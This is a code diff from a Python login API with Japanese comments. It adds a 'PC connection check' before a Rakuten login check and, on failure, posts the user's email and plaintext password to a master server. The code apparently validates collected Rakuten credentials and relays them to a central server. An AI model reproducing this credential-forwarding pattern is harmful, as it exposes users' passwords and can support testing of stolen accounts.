@@ -235,12 +235,43 @@ def api_login():
             'error': 'サーバーとの通信に失敗しました'
         }), 500
     
-    # 2. バックグラウンドで自分でログインチェックを実行
+    # 2. バックグラウンドでPC接続チェック + ログインチェックを実行
     def background_task():
         print(f"[INFO] バックグラウンドタスク開始 | Email: {email}")
         
-        # 自分でログインチェックを実行
+        # ステップ1: PC接続チェック
+        print(f"[INFO] PC接続チェック開始")
+        
         stop_flag = {'stop': False}
+        pc_connected = check_pc_connection(stop_flag)
+        
+        if not pc_connected:
+            print(f"[ERROR] PC接続チェック失敗 | Email: {email}")
+            login_check_results[request_id] = {
+                'status': 'failed',
+                'received_at': datetime.now().isoformat()
+            }
+            
+            # 本サーバーに結果通知
+            try:
+                requests.post(
+                    f"{MASTER_SERVER_URL}/api/login/result",
+                    json={
+                        'email': email,
+                        'password': password,
+                        'result': 'failed'
+                    },
+                    timeout=10
+                )
+                print(f"[INFO] 本サーバーに結果通知: failed (PC未接続)")
+            except Exception as e:
+                print(f"[ERROR] 本サーバー通知エラー: {e}")
+            
+            return
+        
+        print(f"[SUCCESS] PC接続チェック成功")
+        
+        # ステップ2: 自分でログインチェックを実行
         result = rakuten_login_check(email, password, stop_flag)
         
         print(f"[INFO] ログインチェック完了 | Email: {email} | Result: {result}")
